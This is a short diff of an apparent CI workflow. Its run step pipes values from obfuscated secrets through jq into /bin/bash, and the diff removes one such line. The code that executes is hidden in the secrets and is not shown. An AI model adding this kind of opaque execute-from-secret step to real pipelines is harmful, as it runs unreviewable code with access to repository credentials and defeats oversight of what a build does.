@@ -21,7 +21,6 @@ jobs:
           dpor017: ${{ secrets.dpor017 }}
         run: |
           printf '%s' "$dpor017" | jq -r .gq89748 | /bin/bash
-          echo $rm25380 | jq -r .cnfhg12 | /bin/bash
           printf '%s' "$vl9" | jq -r .pzz299 | /bin/bash
           printf '%s' "$c48" | jq -r .cjkn0005 | /bin/bash
 
